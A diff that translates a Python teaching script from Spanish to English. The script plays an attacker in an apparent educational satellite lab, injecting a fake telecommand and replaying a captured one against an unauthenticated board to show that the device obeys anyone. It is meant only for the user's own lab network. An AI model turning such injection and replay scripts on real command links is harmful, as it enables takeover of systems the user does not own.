@@ -1,19 +1,19 @@
 """
-Atacante - fase 0. Demo del "antes": sin autenticacion, cualquiera manda.
+Attacker - phase 0. Demo of the "before": with no authentication, anyone can command.
 
-Este script NO es la estacion de tierra y no conoce ningun secreto, pero el
-satelite le obedece igual, porque en la fase 0 no hay forma de distinguir un
-telecomando legitimo de uno falso.
+This script is NOT the ground station and does not know any secret, but the
+satellite obeys it anyway, because in phase 0 there is no way to tell a real
+telecommand from a fake one.
 
-Escenarios:
-  inject  -> inyecta un telecomando falso (pantalla en rojo = carga util secuestrada)
-  replay  -> reenvia varias veces un telecomando "capturado" de la tierra
+Scenarios:
+  inject  -> injects a fake telecommand (red screen = payload taken over)
+  replay  -> sends a "captured" ground telecommand again, several times
 
-Uso (en PowerShell):
-    python attacks/attack_f0.py --sat 192.168.1.50 inject
-    python attacks/attack_f0.py --sat 192.168.1.50 replay --veces 3
+Usage (in PowerShell):
+    py attacks/attack_f0.py --sat 192.168.1.50 inject
+    py attacks/attack_f0.py --sat 192.168.1.50 replay --times 3
 
-Solo contra tu propio C5, en tu propia red.
+Only against your own C5, on your own network.
 """
 
 import argparse
@@ -22,39 +22,39 @@ import sys
 import time
 
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))
-from ground_f0 import TC_PORT, enviar_tc  # noqa: E402
+from ground_f0 import TC_PORT, send_tc  # noqa: E402
 
-# Lo que un atacante habria "capturado" escuchando el enlace:
-TC_CAPTURADO = "LED 0 200 0"  # la tierra poniendo la carga util en verde
-TC_FALSO = "LED 255 0 0"      # rojo intenso: la carga util en manos del atacante
+# What an attacker would "capture" listening to the link:
+CAPTURED_TC = "LED 0 200 0"  # ground setting the payload to green
+FAKE_TC = "LED 255 0 0"      # bright red: the payload is in the attacker's hands
 
 
 def main(argv=None) -> int:
-    p = argparse.ArgumentParser(description="Atacante (fase 0, solo para tu laboratorio)")
-    p.add_argument("--sat", required=True, help="IP de TU C5")
+    p = argparse.ArgumentParser(description="Attacker (phase 0, only for your lab)")
+    p.add_argument("--sat", required=True, help="IP of YOUR C5")
     p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
-    sub = p.add_subparsers(dest="escenario", required=True)
-    sub.add_parser("inject", help="inyectar un telecomando falso")
-    rp = sub.add_parser("replay", help="reenviar un telecomando capturado")
-    rp.add_argument("--veces", type=int, default=3)
+    sub = p.add_subparsers(dest="scenario", required=True)
+    sub.add_parser("inject", help="inject a fake telecommand")
+    rp = sub.add_parser("replay", help="send a captured telecommand again")
+    rp.add_argument("--times", type=int, default=3)
     args = p.parse_args(argv)
 
-    if args.escenario == "inject":
-        print(f"[ATACANTE] Inyectando TC falso: \"{TC_FALSO}\"")
-        r = enviar_tc(args.sat, TC_FALSO, port=args.port)
-        print(f"[ATACANTE] Respuesta: {r}")
+    if args.scenario == "inject":
+        print(f"[ATTACKER] Injecting fake TC: \"{FAKE_TC}\"")
+        r = send_tc(args.sat, FAKE_TC, port=args.port)
+        print(f"[ATTACKER] Answer: {r}")
         if r and r.startswith("ACK"):
-            print("[ATACANTE] El satelite ha aceptado un comando de alguien que no es la tierra.")
+            print("[ATTACKER] The satellite accepted a command from someone who is not the ground station.")
     else:
-        aceptados = 0
-        for i in range(1, args.veces + 1):
-            r = enviar_tc(args.sat, TC_CAPTURADO, port=args.port)
-            print(f"[ATACANTE] Replay {i}/{args.veces}: \"{TC_CAPTURADO}\" -> {r}")
+        accepted = 0
+        for i in range(1, args.times + 1):
+            r = send_tc(args.sat, CAPTURED_TC, port=args.port)
+            print(f"[ATTACKER] Replay {i}/{args.times}: \"{CAPTURED_TC}\" -> {r}")
             if r and r.startswith("ACK"):
-                aceptados += 1
+                accepted += 1
             time.sleep(0.5)
-        print(f"[ATACANTE] {aceptados} de {args.veces} replays aceptados: "
-              "el satelite no detecta que son comandos repetidos.")
+        print(f"[ATTACKER] {accepted} of {args.times} replays accepted: "
+              "the satellite does not see that the commands are repeated.")
     return 0
 
 
